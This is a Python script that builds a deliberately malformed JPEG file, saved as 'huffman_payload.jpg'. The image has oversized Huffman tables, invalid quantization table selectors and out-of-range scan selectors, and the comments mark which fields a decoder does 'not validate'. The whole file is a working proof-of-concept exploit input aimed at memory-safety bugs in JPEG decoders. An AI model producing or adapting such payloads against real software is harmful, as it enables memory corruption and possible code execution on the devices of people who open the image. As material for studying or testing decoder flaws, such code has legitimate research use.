from struct import pack

JPEG_ESC_CHAR      = 0xFF

JPEG_SAMPLING_1x1  = 0x11

JPEG_MARKER_SOI    = 0xd8
JPEG_MARKER_EOI    = 0xd9
JPEG_MARKER_DHT    = 0xc4
JPEG_MARKER_DQT    = 0xdb
JPEG_MARKER_SOF0   = 0xc0
JPEG_MARKER_SOS    = 0xda
JPEG_MARKER_DRI    = 0xdd
JPEG_MARKER_RST0   = 0xd0
JPEG_MARKER_RST1   = 0xd1
JPEG_MARKER_RST2   = 0xd2
JPEG_MARKER_RST3   = 0xd3
JPEG_MARKER_RST4   = 0xd4
JPEG_MARKER_RST5   = 0xd5
JPEG_MARKER_RST6   = 0xd6
JPEG_MARKER_RST7   = 0xd7

quan_table_size = 64
id_size = 1
marker_size = 2

def create_header():
	jpg  = pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_SOI)		# start of image
	jpg += pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_DQT)
	jpg += pack(">H", quan_table_size + id_size + marker_size)	# next marker
	jpg += pack("B", 0)						# id
	jpg += "A" * quan_table_size
	jpg += pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_DQT)
	jpg += pack(">H", quan_table_size + id_size + marker_size)	# next marker
	jpg += pack("B", 1)						# id
	jpg += "B" * quan_table_size
	jpg += pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_DRI)
	jpg += pack(">H", 4)						# DRI marker should be 4 
	jpg += pack(">H", 0xFFFF)					# not validated
	return jpg

def create_footer():
	jpg  = pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_EOI)		# end of image
	return jpg

def create_fake_sof_qt(qt_selector0, qt_selector1, qt_selector2):
	jpg  = pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_SOF0)
	jpg += pack(">H", marker_size + 0xF)				# SOF0 length, next marker
	jpg += pack("B", 8)						# sample precision
	jpg += pack(">H", 0x200)					# height
	jpg += pack(">H", 0x200)					# width
	jpg += pack("B", 3)						# component count
	jpg += pack("B", 1)						# compoenent id0
	jpg += pack("B", 2 << 4 | 2)					# horizontal sampling | vertical sampling, both not validated
	jpg += pack("B", qt_selector0)					# quant table selector, not validated
	jpg += pack("B", 2)						# compoenent id1
	jpg += pack("B", JPEG_SAMPLING_1x1)				
	jpg += pack("B", qt_selector1)						
	jpg += pack("B", 3)						# compoenent id2
	jpg += pack("B", JPEG_SAMPLING_1x1)				
	jpg += pack("B", qt_selector2)						
	return jpg

def create_fake_sof_sampling(hs, vs):
	jpg  = pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_SOF0)
	jpg += pack(">H", marker_size + 0x8)				# SOF0 length, next marker
	jpg += pack("B", 8)						# sample precision
	jpg += pack(">H", 0x200)					# height
	jpg += pack(">H", 0x200)					# width
	jpg += pack("B", 3)						# component count
	jpg += pack("B", 1)						# compoenent id0
	jpg += pack("B", hs << 4 | vs)					# horizontal sampling | vertical sampling, both not validated
	return jpg

def create_huffman_table(ac, hid):

	num_huffman_code = 0xFF
	huffman_values = 4080

	jpg  = pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_DHT)
	jpg += pack(">H", marker_size + 16 + huffman_values + id_size)	# next marker, 16 is sizeof(count), 4080 huffman codes
	jpg += pack("B", ac << 4 | hid)					# id = table class << 4 | table identifier
	jpg += chr(num_huffman_code) * 16				# number of huffman code, value not validated
	jpg += chr(0xFF) * 4080						# based on previous value
	return jpg

def create_scan_header(dc, ac):
	jpg  = pack(">H", JPEG_ESC_CHAR << 8 | JPEG_MARKER_SOS)
	jpg += pack(">H", marker_size + 0xA)				# SOS offset to data
	jpg += pack("B", 3)						# component count
	jpg += pack("B", 1)						# compoenent id0
	jpg += pack("B", dc << 4 | ac)					# dc and ac entropy coding table selector
	jpg += pack("B", 2)						# component id1
	jpg += pack("B", dc << 4 | ac)				
	jpg += pack("B", 3)						# component id2
	jpg += pack("B", dc << 4 | ac)					
	jpg += pack("B", 0xFF)						# unused
	jpg += pack(">H", 0xFFFF)					# unused
	return jpg

jpg  = create_header()
jpg += create_fake_sof_qt(0, 1, 2)
jpg += create_huffman_table(0, 0)
jpg += create_huffman_table(0, 1)
jpg += create_huffman_table(1, 1)
jpg += create_scan_header(0xF, 0xF)
jpg += create_footer()

# write to file
image = open("huffman_payload.jpg", "wb")
image.write(jpg)
image.close()
